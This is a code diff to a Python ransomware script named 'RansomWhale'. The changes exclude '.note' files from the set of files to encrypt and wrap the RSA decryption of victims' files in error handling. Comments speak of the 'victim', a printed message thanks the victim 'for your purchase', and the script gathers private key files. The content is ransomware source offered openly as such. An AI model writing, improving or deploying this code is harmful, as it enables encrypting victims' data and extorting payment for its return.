@@ -38,7 +38,7 @@ for filename in files:
         important.append(filename)
         print ("I see you have a private key, let me validate that for you...")
 
-    elif ".pem" not in filename and "HomeworkHeroes" not in filename and ".sh" not in filename:    #This makes sure we do not accidentally Encrypt things victim needs
+    elif ".pem" not in filename and "HomeworkHeroes" not in filename and ".sh" not in filename and ".note" not in filename:    #This makes sure we do not accidentally Encrypt things victim needs
         file_list.append(filename)
 ###############################################
 
@@ -152,16 +152,22 @@ else:     #read the public.key, if it works, then decrypt the files
         with open(file, 'rb') as f:
             f_bytes = f.read()
             
-        f_bytes_decrypt = private_key2.decrypt(f_bytes,
-                                              padding.OAEP(mgf=padding.MGF1(algorithm=hashes.SHA256()),
-                                                           algorithm=hashes.SHA256(),
-                                                           label=None)
-                                              )
-        fileName = str(file).replace('.RansomWhale.mp4','')   #Replaces our Encrypted File's Extension with the file's Original Extensions
-        decFile = fileName   #Build our Decrypted file, Filename without the RansomWhale.mp4 extension, possibly unnecessary   
-        
-        with open(decFile,'wb') as f:
-            f.write(f_bytes_decrypt)   #Writes our decrypted bytes to the file with the Original Extensions
-            os.remove(file)            #Removes the old encrypted file
-            print(f"Successfully decrypted {decFile}, thank you for your purchase.")
+        try: #6/1 added try
+            
+            f_bytes_decrypt = private_key2.decrypt(f_bytes,
+                                                padding.OAEP(mgf=padding.MGF1(algorithm=hashes.SHA256()),
+                                                            algorithm=hashes.SHA256(),
+                                                            label=None)
+                                                )
+            fileName = str(file).replace('.RansomWhale.mp4','')   #Replaces our Encrypted File's Extension with the file's Original Extensions
+            decFile = fileName   #Build our Decrypted file, Filename without the RansomWhale.mp4 extension, possibly unnecessary   
+            
+            with open(decFile,'wb') as f:
+                f.write(f_bytes_decrypt)   #Writes our decrypted bytes to the file with the Original Extensions
+                os.remove(file)            #Removes the old encrypted file
+                print(f"Successfully decrypted {decFile}, thank you for your purchase.")
+        except ValueError as e:
+            print(f"Failed to decrypt {file}: {e}") #debugging purposes
+
     ################################################
+    
